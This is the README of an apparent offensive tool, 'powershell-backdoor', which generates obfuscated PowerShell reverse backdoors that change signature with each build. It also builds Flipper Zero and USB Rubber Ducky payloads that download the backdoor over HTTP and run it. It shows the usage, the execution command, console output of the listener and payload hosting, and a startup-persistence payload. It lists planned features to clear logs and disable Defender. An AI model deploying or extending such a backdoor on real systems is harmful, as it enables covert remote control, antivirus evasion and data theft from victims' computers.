# powershell-backdoor
Reverse backdoor written in Powershell and obfuscated with Python. Allowing the backdoor to have a new signature after every build. With the capabilties to create a Flipper Zero/ Hak5 USB Rubber ducky payload. 
```
usage: listen.py [-h] [--ip-address IP_ADDRESS] [--port PORT] [--random] [--out OUT] [--verbose] [--delay DELAY] [--flipper FLIPPER] [--ducky]
                 [--server-port SERVER_PORT] [--payload PAYLOAD] [--list--payloads] [-k KEYBOARD] [-L] [-H]

Powershell Backdoor Generator

options:
  -h, --help            show this help message and exit
  --ip-address IP_ADDRESS, -i IP_ADDRESS
                        IP Address to bind the backdoor too (default: 192.168.X.XX)
  --port PORT, -p PORT  Port for the backdoor to connect over (default: 4444)
  --random, -r          Randomizes the outputed backdoor's file name
  --out OUT, -o OUT     Specify the backdoor filename (relative file names)
  --verbose, -v         Show verbose output
  --delay DELAY         Delay in milliseconds before Flipper Zero/Ducky-Script payload execution (default:100)
  --flipper FLIPPER     Payload file for flipper zero (includes EOL conversion) (relative file name)
  --ducky               Creates an inject.bin for the http server
  --server-port SERVER_PORT
                        Port to run the HTTP server on (--server) (default: 8080)
  --payload PAYLOAD     USB Rubber Ducky/Flipper Zero backdoor payload to execute
  --list--payloads      List all available payloads
  -k KEYBOARD, --keyboard KEYBOARD
                        Keyboard layout for Bad Usb/Flipper Zero (default: us)
  -A, --actually-listen
                        Just listen for any backdoor connections
  -H, --listen-and-host
                        Just listen for any backdoor connections and host the backdoor directory
```
# Quick Links
* [Preview](#preview)
* [Features](#features)
* [Standard Backdoor](#standard-backdoor)
* [Flipper Zero Backdoor](#flipper-zero-backdoor)
* [USB Rubber Ducky Backdoor](#usb-rubber-ducky-backdoor)
* [Thanks](#thanks)
* [To Do](#to-do)
* [Output of 5 Obfuscations](#Output-of-5-Obfuscations)

## Preview
![preview](/core/images/preview.PNG)
<br>

## Features
* Hak5 Rubber Ducky payload
* Flipper Zero payload
* Download Files from remote system
* Play wav files from a URL
* Fetch target computers public IP address
* List local users
* Find Intresting Files
* Enumerate OS Information
* Find BIOS Information
* Get Anti-Virus Status
* Get Active TCP Clients
* Install Choco (https://chocolatey.org/)
* Checks for common pentesting software installed

## Standard backdoor
``` bash
C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --verbose
[*] Encoding backdoor script
[*] Saved backdoor backdoor.ps1 sha1:32b9ca5c3cd088323da7aed161a788709d171b71
[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
```
A file in the current working directory will be created called backdoor.ps1

### Backdoor Execution
Tested on Windows 11, Windows 10 and Kali Linux
```cmd
powershell.exe -File backdoor.ps1 -ExecutionPolicy Unrestricted
```
```cmd
┌──(drew㉿kali)-[/home/drew/Documents]
└─PS> ./backdoor.ps1
```

# Bad USB/ USB Rubber Ducky attacks
When using any of these attacks you will be opening up a HTTP server hosting the backdoor. Once the backdoor is retrieved the HTTP server will be shutdown.

## Payloads
   * Execute -- Execute the backdoor 
   * BindAndExecute -- Place the backdoor in the users temp directory, bind the backdoor to startup and then execute it. (Requires Admin)
## Flipper Zero Backdoor
Below will generate a file called powershell_backdoor.txt, which when triggered on the Flipper will fetch the backdoor from your computer over HTTP and execute it.
```
C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --flipper powershell_backdoor --payload execute
[*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
```
Place the text file you specified (e.g: powershell_backdoor.txt) into your flipper zero. When the payload is executed 
it will download and execute backdoor.ps1

## Usb Rubber Ducky Backdoor
Below is a tutorial on how to generate an inject.bin file for the Hak5 USB Rubber ducky
```
 C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --ducky --payload BindAndExecute
[*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
```
A file named inject.bin will be placed in your current working directory. Java is required for this feature. When the payload is executed 
it will download and execute backdoor.ps1

## Thanks
To encode payload.txt into inject.bin for USB Rubber Ducky Attacks I use encoder.jar created by ![midnitesnake](https://github.com/midnitesnake).

## To Do 
* Pull Recent RDP connections
* Change Wallpaper from URL
* Find Writeable Directories
* Clear Logs
* Disable Defender

## Output of 5 Obfuscations
Below is the sha1 hash of backdoor.ps1 after 5 builds.
```
1e158f02484e5c58d74c1507a1773392ffacfca2
6d18230a419195d0f77519abc0238768956cdd58
558a8cbac40239c9e6660a45cc8fc5d02b5057d7
caf4d0c8424eceb960d5f5c526e83ecd485c4ac9
947b57824917842d79f9cbcac8a795aa7c2f8a49
```
